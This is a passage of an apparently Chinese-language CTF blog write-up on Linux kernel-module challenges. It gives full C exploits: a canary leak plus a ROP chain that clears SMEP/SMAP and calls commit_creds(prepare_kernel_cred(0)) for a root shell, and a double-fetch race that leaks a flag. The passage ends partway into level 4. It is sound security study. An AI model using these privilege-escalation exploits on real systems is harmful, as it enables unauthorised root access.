<h2 id="0x2-level2"><a href="#0x2-level2" class="headerlink" title="0x2 level2"></a>0x2 level2</h2><h3 id="0x2-1-boot-sh"><a href="#0x2-1-boot-sh" class="headerlink" title="0x2.1 boot.sh"></a>0x2.1 boot.sh</h3><p>难度升级，开起了smep,smap和kaslr,为了方便调试先关闭kaslr.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">#!/bin/bash</span><br><span class="line"></span><br><span class="line">stty intr ^]</span><br><span class="line">cd `dirname $0`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="0x2-2-ko文件保护"><a href="#0x2-2-ko文件保护" class="headerlink" title="0x2.2 ko文件保护"></a>0x2.2 ko文件保护</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">.ko</span><br><span class="line">[*] &#x27;/home/rootzhang/kernelstudy/pwnstudy/level2/baby.ko&#x27;</span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    No RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x0)</span><br></pre></td></tr></table></figure>

<p>比原来多了canary保护</p>
<h3 id="0x2-3-baby-ko"><a href="#0x2-3-baby-ko" class="headerlink" title="0x2.3 baby.ko"></a>0x2.3 baby.ko</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_0</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rbp</span></span><br><span class="line">  __int64 v3; <span class="comment">// rdx</span></span><br><span class="line">  _QWORD v5[<span class="number">18</span>]; <span class="comment">// [rsp-90h] [rbp-90h] BYREF</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v5[<span class="number">17</span>] = v2;</span><br><span class="line">  v5[<span class="number">16</span>] = __readgsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">24577</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)copy_from_user(v5, v3, <span class="number">512LL</span>);</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">24578</span> )</span><br><span class="line">    <span class="keyword">return</span> (<span class="keyword">int</span>)copy_to_user(v3, v5, <span class="number">512LL</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>存在泄露和溢出，具体思路就是先泄露canary和内核地址，然后再溢出完成提权，提权有两种思路，一个方式是改变smep和smap的标志位然后ret2usr,一种方式是直接rop</p>
<h3 id="0x2-4-exp"><a href="#0x2-4-exp" class="headerlink" title="0x2.4 exp"></a>0x2.4 exp</h3><p>我采用的是更改cr4完成commits(prepare_kernel_cred(0))完成提权。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="keyword">size_t</span> commit_creds_offset=<span class="number">0xb99d0</span>;</span><br><span class="line"><span class="keyword">size_t</span> prepare_kernel_cred_offset=<span class="number">0xb9d80</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_base_addr=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">size_t</span> vmlinux_nokaslr_addr=<span class="number">0xffffffff81000000</span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">usr_shell</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()==<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*]----getshell ok&quot;</span>);</span><br><span class="line">        system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;[*] getshell fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">up_power</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">size_t</span> commit_creds=vmlinux_base_addr+commit_creds_offset;</span><br><span class="line">    <span class="keyword">size_t</span> prepare_kernel_cred=vmlinux_base_addr+prepare_kernel_cred_offset;</span><br><span class="line">     (*((<span class="keyword">void</span> (*)(<span class="keyword">char</span> *))commit_creds))((*((<span class="keyword">char</span>* (*)(<span class="keyword">int</span>))prepare_kernel_cred))(<span class="number">0</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">size_t</span> user_cs,user_ss,user_rflags,user_sp;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">save_status</span><span class="params">()</span></span>&#123;</span><br><span class="line">    __asm__(</span><br><span class="line">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">        <span class="string">&quot;mov user_sp,rsp;&quot;</span></span><br><span class="line">        <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">        <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">    );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has ben saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    save_status();</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;/dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span>(fd&lt;<span class="number">0</span>)&#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[*] open fail&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">size_t</span> buf[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">size_t</span> rop[<span class="number">0x200</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    ioctl(fd,<span class="number">0x6002</span>,buf);</span><br><span class="line">    <span class="keyword">size_t</span> canary=buf[<span class="number">16</span>];</span><br><span class="line">    vmlinux_base_addr=buf[<span class="number">9</span>]<span class="number">-0x29b078</span>;</span><br><span class="line">    <span class="keyword">size_t</span> swapgs_pop_rbp_ret=vmlinux_base_addr+<span class="number">0xffffffff81070834</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">size_t</span> itretq=vmlinux_base_addr+<span class="number">0xffffffff81036a5b</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">size_t</span> mov_cr4_pop_rbp_ret=vmlinux_base_addr+<span class="number">0xffffffff81020300</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">size_t</span> pop_rdi_rbx=vmlinux_base_addr+<span class="number">0xffffffff81087c99</span>-vmlinux_nokaslr_addr;</span><br><span class="line">    <span class="keyword">int</span> i=<span class="number">16</span>;</span><br><span class="line">    rop[i++]=canary;</span><br><span class="line">    i++;</span><br><span class="line">    rop[i++]=pop_rdi_rbx;</span><br><span class="line">    rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++]=<span class="number">0x6f0</span>;</span><br><span class="line">    rop[i++]=mov_cr4_pop_rbp_ret;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)up_power;</span><br><span class="line">    rop[i++]=swapgs_pop_rbp_ret;</span><br><span class="line">    rop[i++]=<span class="number">0</span>;</span><br><span class="line">    rop[i++]=itretq;</span><br><span class="line">    rop[i++]=(<span class="keyword">size_t</span>)usr_shell;</span><br><span class="line">    rop[i++]=user_cs;</span><br><span class="line">    rop[i++]=user_rflags;</span><br><span class="line">    rop[i++]=user_sp;</span><br><span class="line">    rop[i++]=user_ss;</span><br><span class="line">    ioctl(fd,<span class="number">0x6001</span>,rop);</span><br></pre></td></tr></table></figure>

<h2 id="0x3-level3"><a href="#0x3-level3" class="headerlink" title="0x3 level3"></a>0x3 level3</h2><h3 id="0x3-1-start-sh"><a href="#0x3-1-start-sh" class="headerlink" title="0x3.1 start.sh"></a>0x3.1 start.sh</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 256M -smp 2,cores=2,threads=1  \</span><br><span class="line">-kernel ./vmlinuz-4.15.0-22-generic \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet&quot; \</span><br><span class="line">-cpu qemu64 \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>

<p>其中<code>-smp 2,cores=2,threads=1</code>的作用如下</p>
<p><img src="C:\Users\张鹏\AppData\Roaming\Typora\typora-user-images\image-20220406200817128.png" alt="image-20220406200817128"></p>
<p>也就是说这个内核可以开至多两个线程了。</p>
<h3 id="0x3-2-init"><a href="#0x3-2-init" class="headerlink" title="0x3.2 init"></a>0x3.2 init</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"> </span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t sysfs none /sys</span><br><span class="line">mount -t devtmpfs devtmpfs /dev</span><br><span class="line">echo &quot;flag&#123;this_is_a_sample_flag&#125;&quot; &gt; flag</span><br><span class="line">chown root:root flag</span><br><span class="line">chmod 400 flag</span><br><span class="line">exec 0&lt;/dev/console</span><br><span class="line">exec 1&gt;/dev/console</span><br><span class="line">exec 2&gt;/dev/console</span><br><span class="line"></span><br><span class="line">insmod baby.ko</span><br><span class="line">chmod 777 /dev/baby</span><br><span class="line">echo -e &quot;\nBoot took $(cut -d&#x27; &#x27; -f1 /proc/uptime) seconds\n&quot;</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line"></span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line">poweroff -d 0  -f</span><br></pre></td></tr></table></figure>

<h3 id="0x3-3-ko文件"><a href="#0x3-3-ko文件" class="headerlink" title="0x3.3 ko文件"></a>0x3.3 ko文件</h3><p>一个函数</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">baby_ioctl</span><span class="params">(__int64 a1, <span class="keyword">int</span> a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp-5Ch] [rbp-5Ch]</span></span><br><span class="line">  __int64 v5; <span class="comment">// [rsp-58h] [rbp-58h]</span></span><br><span class="line"></span><br><span class="line">  _fentry__();</span><br><span class="line">  v5 = v2;</span><br><span class="line">  <span class="keyword">if</span> ( a2 == <span class="number">26214</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    printk(<span class="string">&quot;Your flag is at %px! But I don&#x27;t think you know it&#x27;s content\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> ( a2 == <span class="number">4919</span></span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(v2, <span class="number">16LL</span>, *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>))</span><br><span class="line">         &amp;&amp; !_chk_range_not_ok(</span><br><span class="line">               *(_QWORD *)v5,</span><br><span class="line">               *(<span class="keyword">int</span> *)(v5 + <span class="number">8</span>),</span><br><span class="line">               *(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> <span class="keyword">int</span>)&amp;current_task) + <span class="number">4952</span>))</span><br><span class="line">         &amp;&amp; *(_DWORD *)(v5 + <span class="number">8</span>) == <span class="built_in">strlen</span>(flag) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt; <span class="built_in">strlen</span>(flag); ++i )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(*(_QWORD *)v5 + i) != flag[i] )</span><br><span class="line">        <span class="keyword">return</span> <span class="number">22LL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    printk(<span class="string">&quot;Looks like the flag is not a secret anymore. So here is it %s\n&quot;</span>, flag);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">14LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>分析：允许传入一个结构体的指针，结构体长这个样子</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;m;</span><br></pre></td></tr></table></figure>

<p>他会检查buf+len的地址又没有超出用户态的最高地址，如果超出了就会退出，如果没有超出就会拿buf的字符一个个和flag比对，如果全部比对成功就会返回flag值。</p>
<p>漏洞利用：这个内核允许开两个线程，所以可以利用这一点，主线程传入正常的m然后开启一个支线程一直修改m的buf为flag_addr,这样支线程就有几率当主线程刚检查完m后支线程修改m.buf=flag_addr,这样就能比对成功输出flag值了。</p>
<h3 id="0x3-4"><a href="#0x3-4" class="headerlink" title="0x3.4"></a>0x3.4</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">message</span>&#123;</span></span><br><span class="line">    <span class="keyword">char</span> *buf;</span><br><span class="line">    <span class="keyword">int</span> len;</span><br><span class="line">&#125;m;</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">change_flag_addr</span><span class="params">(<span class="keyword">size_t</span> flag_addr)</span></span>&#123;</span><br><span class="line">    <span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">        m.buf=flag_addr;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> fd=open(<span class="string">&quot;dev/baby&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    ioctl(fd,<span class="number">0x6666</span>,<span class="number">0</span>);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Your flag is at &#x27; &gt; ./flag_addr.txt&quot;</span>);</span><br><span class="line">    <span class="keyword">int</span> temp_fd=open(<span class="string">&quot;./flag_addr.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    <span class="keyword">char</span> buf[<span class="number">100</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int</span> len=<span class="built_in">strlen</span>(<span class="string">&quot;[    2.817016] Your flag is at &quot;</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">size_t</span> flag_addr=strtoull(buf+len,buf+len+<span class="number">16</span>,<span class="number">16</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;flag_addr:%d\n&quot;</span>,flag_addr);</span><br><span class="line">    m.buf=buf;</span><br><span class="line">    <span class="keyword">int</span> ret;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">100</span>;i++)&#123;</span><br><span class="line">        m.len=i;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">22</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;flag_len:%d\n&quot;</span>,i);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;</span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,change_flag_addr,flag_addr);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">0x100000</span>;i++)&#123;</span><br><span class="line">        m.buf=buf;</span><br><span class="line">        ret=ioctl(fd,<span class="number">0x1337</span>,&amp;m);</span><br><span class="line">        <span class="keyword">if</span>(ret==<span class="number">0</span>)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;susses\n&quot;</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    close(fd);</span><br><span class="line">    system(<span class="string">&quot;dmesg |grep &#x27;Looks like the flag is&#x27; &gt; ./flag.txt&quot;</span>);</span><br><span class="line">    temp_fd=open(<span class="string">&quot;./flag.txt&quot;</span>,<span class="number">0</span>);</span><br><span class="line">    read(temp_fd,buf,<span class="number">100</span>);</span><br><span class="line">    write(STDOUT_FILENO,buf,<span class="number">100</span>);</span><br><span class="line">    close(temp_fd);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="0x3-5-收获"><a href="#0x3-5-收获" class="headerlink" title="0x3.5 收获"></a>0x3.5 收获</h3><p>1.第一次做多线程的内核题，主要利用姿势就是通过主线程完成检查后支线程修改数据。</p>
<p>2.strtoull函数，第一个参数是要转换字符串的首地址，第二个是要转换的字符串的最后一个地址的后一个地址，第三个参数是进制，返回一个8字节数。</p>
<h2 id="0x4-level4"><a href="#0x4-level4" class="headerlink" title="0x4 level4"></a>0x4 level4</h2><h3 id="0x4-1-start-sh"><a href="#0x4-1-start-sh" class="headerlink" title="0x4.1 start.sh"></a>0x4.1 start.sh</h3><p>保护全开，本地调试的时候先关闭kaslr.</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">stty intr ^]</span><br><span class="line">cd `dirname $0`</span><br><span class="line">timeout --foreground 600 qemu-system-x86_64 \</span><br><span class="line">    -m 64M \</span><br><span class="line">    -nographic \</span><br><span class="line">    -kernel bzImage \</span><br><span class="line">    -append &#x27;console=ttyS0 loglevel=3 oops=panic panic=1 kaslr&#x27; \</span><br><span class="line">    -monitor /dev/null \</span><br><span class="line">    -initrd initramfs.cpio \</span><br><span class="line">    -smp cores=1,threads=1 \</span><br><span class="line">    -cpu qemu64,smep,smap 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<h3 id="0x4-2-init"><a href="#0x4-2-init" class="headerlink" title="0x4.2 init"></a>0x4.2 init</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></span><br><span class="line"></span><br><span class="line">echo &quot;IF8gIF9fICAgICAgICAgICAgICAgXyAgICAgICAgICBfICAgICAKfCB8LyAvX19fICBfX18gXyBfXyB8IHwgICAgX18gX3wgfF9fICAKfCAnIC8vIF8gXC8gXyBcICdfIFx8IHwgICAvIF9gIHwgJ18gXCAKfCAuIFwgIF9fLyAgX18vIHwgfCB8IHxfX3wgKF98IHwgfF8pIHwKfF98XF9cX19ffFxfX198X3wgfF98X19fX19cX18sX3xfLl9fLyAKICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAK&quot; | base64 -d</span><br><span class="line"></span><br><span class="line">mount -t proc none /proc</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">mkdir /dev/pts</span><br><span class="line">mount /dev/pts</span><br><span class="line"></span><br><span class="line">insmod /home/pwn/baby.ko</span><br><span class="line">chmod 644 /dev/baby</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">cd /home/pwn</span><br><span class="line">setsid cttyhack setuidgid 1000 sh</span><br><span class="line">umount /proc</span><br><span class="line">poweroff -f</span><br></pre></td></tr></table></figure>

<p>0x4.3 ko文件</p>
